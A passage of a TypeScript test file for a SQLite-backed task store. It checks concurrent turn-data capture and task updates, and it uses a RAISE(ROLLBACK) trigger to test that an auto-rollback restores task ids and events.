							cacheRead: 0,
							cacheWrite: 0,
							cost: { total: 0.25 },
						},
						contextSnapshot: { promptTokens: 15000, compactionEpoch: 0 },
					},
				})}\n`,
			);
			const entered = Promise.withResolvers<void>();
			const release = Promise.withResolvers<void>();
			const paused = store.transaction(async () => {
				entered.resolve();
				await release.promise;
			});
			await entered.promise;
			const capture = store.captureTurnData(turn.id);
			const update =
				changed === "window"
					? store.finishTurnState(turn.id, { endedAt: turn.startedAt + 2000 })
					: store.updateTask(card.id, {
							sessionId: "cccc0000-0000-0000-0000-000000000812",
						});
			release.resolve();
			await Promise.all([paused, capture, update]);
			const facts = await store.perfFacts();
			expect(facts.turns).toEqual([
				{
					endedAt: turn.startedAt + (changed === "window" ? 2000 : 1000),
					failed: false,
					cost: null,
				},
			]);
			expect(facts.tasks[0]?.contextTokens).toBe(
				changed === "session" ? null : 15000,
			);
			expect((await store.getTask(card.id))?.sessionId).toBe(
				changed === "session"
					? "cccc0000-0000-0000-0000-000000000812"
					: sessionId,
			);
			expect((await store.listTurns(card.id))[0]?.endedAt).toBe(
				turn.startedAt + (changed === "window" ? 2000 : 1000),
			);
			expect(
				(await store.events()).map((event) => [event.kind, event.to]),
			).toEqual([
				["create", "todo"],
				["state", "queued"],
			]);
		}
	});
});

// A trigger RAISE(ROLLBACK, ...) reproduces the SQLITE_FULL auto-rollback shape
// (SQLite discards the transaction before the store's rollback hook runs) without
// resource pressure: only the createTask call carrying the trigger prompt fails.
describe("sqlite auto-rollback", () => {
	test("a trigger rollback keeps the original error, rolls the id and events back, and leaves the store usable", async () => {
		const dir = join(root, "auto-rollback");
		const seeded = await open(dir);
		await seeded.close(); // release the exclusive lock so the fixture can add the trigger
		const seed = new Database(join(tasksDirFor(dir), "tasks.db"));
		seed.exec(
			"CREATE TRIGGER tasks_doomed BEFORE INSERT ON tasks WHEN NEW.prompt = 'doomed-prompt' BEGIN SELECT RAISE(ROLLBACK, 'synthetic doom'); END;",
		);
		seed.close();
		const store = await open(dir);
		const prefix = await store.taskPrefix();
		const first = await store.createTask("first card");
		expect(first.id).toBe(`${prefix}-1`);
		await expect(store.createTask("doomed-prompt")).rejects.toThrow(
			"synthetic doom",
		);
		// The transaction rolled back: no doomed card, no doomed events, and the
		// consumed id is back, so the next card reuses it (no id gap).
		expect(await store.getTask(first.id)).toEqual(first);
		expect((await store.listTasks()).map((task) => task.id)).toEqual([
			first.id,
		]);
		expect(
			(await store.events()).map((event) => [
				event.kind,
				event.taskId,
				event.from,
				event.to,
			]),
		).toEqual([
			["create", first.id, null, "todo"],
			["state", first.id, null, "queued"],
		]);
		const second = await store.createTask("second card");
		expect(second.id).toBe(`${prefix}-2`);
		expect((await store.listTasks()).map((task) => task.id)).toEqual([
			second.id,
			first.id,
		]);
	});
});
